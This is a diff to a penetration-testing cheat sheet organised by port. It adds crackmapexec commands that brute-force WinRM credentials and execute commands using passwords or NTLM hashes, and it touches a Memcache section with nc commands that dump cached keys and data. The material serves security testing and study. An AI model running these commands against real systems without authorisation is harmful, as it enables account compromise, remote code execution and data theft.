@@ -25,7 +25,7 @@
 * [Port 1433](#port-1433)
 * [Port 3389](#port-3389)
 * [Port 5672](#port-5672)
-* [Port 5985](#port-5985)
+* [Port 5985](#port-5985,-5986)
 * [Port 11211](#port-11211)
 * [Port 15672](#port-15672)
 
@@ -455,9 +455,23 @@ for k,v in conn.server_properties.items():
     print(k,v)
 ```
 
-## 🔻Port 5985
+## 🔻Port 5985, 5986
 
-#### login remotely over WinRM (using TGT ticket as example)
+Details : https://book.hacktricks.xyz/network-services-pentesting/5985-5986-pentesting-winrm
+
+#### ➤ Brute force 
+```
+#Brute force
+crackmapexec winrm <IP> -d <Domain Name> -u usernames.txt -p passwords.txt
+
+#Check a pair of credentials (Password) and execute a command
+crackmapexec winrm <IP> -d <Domain Name> -u <username> -p <password> -x "whoami"
+
+# Check a pair of credentials (Hash) and execute a PS command
+crackmapexec winrm <IP> -d <Domain Name> -u <username> -H <HASH> -X '$PSVersionTable'
+```
+
+#### ➤ login remotely over WinRM (using TGT ticket as example)
 
 https://github.com/Hackplayers/evil-winrm
 
@@ -470,12 +484,12 @@ evil-winrm -i <IP> -u <USERNAME> -p <PASSWORD>
 
 ## 🔻Port 11211 - Memcache
 
-#### Nmap enumeration
+#### ➤ Nmap enumeration
 ```
 nmap -n -sV --script memcached-info -p 11211 10.0.0.1
 ```
 
-#### Manual enumeration
+#### ➤ Manual enumeration
 ```
 echo "version" | nc -vn -w 1 <IP> 11211      #Get version
 echo "stats" | nc -vn -w 1 <IP> 11211        #Get status
@@ -485,7 +499,7 @@ echo "stats cachedump <number> 0" | nc -vn -w 1 <IP> 11211  #Get key names (the 
 echo "get <item_name>" | nc -vn -w 1 <IP> 11211  #Get saved info
 ```
 
-#### Extraction data script
+#### ➤ Extraction data script
 ```
 ➤ Install and use memcdump
 mencdump --verbose --debug --servers=10.0.0.1 | tee keys.lst
